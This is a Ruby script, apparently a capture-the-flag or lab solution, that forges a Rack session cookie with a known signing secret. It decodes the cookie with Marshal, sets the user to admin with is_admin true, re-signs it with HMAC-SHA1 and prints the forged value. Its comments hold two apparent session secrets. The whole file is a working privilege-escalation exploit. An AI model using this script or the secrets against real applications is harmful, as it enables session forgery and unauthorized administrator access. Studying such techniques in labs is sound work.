#!/usr/bin/env ruby
# podman run --rm -v $(pwd):/host -ti ruby:2.5 bash
# gem install rack-webconsole
#
# Other secrets:
#   JFp2UzEeEfuZD3IfbR9MGgdgZxGOe6tVE
#   J09tE4Lfvdtcfw696MK7oKxdMd7KrGbCf
require 'openssl'
require 'uri'
require 'pp'
require 'base64'
require 'rack/session/cookie'


SECRET = ARGV.shift
COOKIES= ARGV.shift

def sign(data, secret)
  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

value, signed = COOKIES.split("--",2)
obj = Marshal.load(Base64.decode64(value))
obj['user_name'] = "admin"
obj['is_admin'] = true
pp obj
new_value = Marshal.dump(obj)
new_cookie = Base64.strict_encode64(new_value) + "--" + sign(Base64.strict_encode64(new_value), SECRET)
puts new_cookie


# value = Base64.decode64(URI.decode(value)).sub!('Admin', 'admin')

#puts Base64.strict_encode64(value), '--', sign(Base64.strict_encode64(value), "JFp2UzEeEfuZD3IfbR9MGgdgZxGOe6tVE")
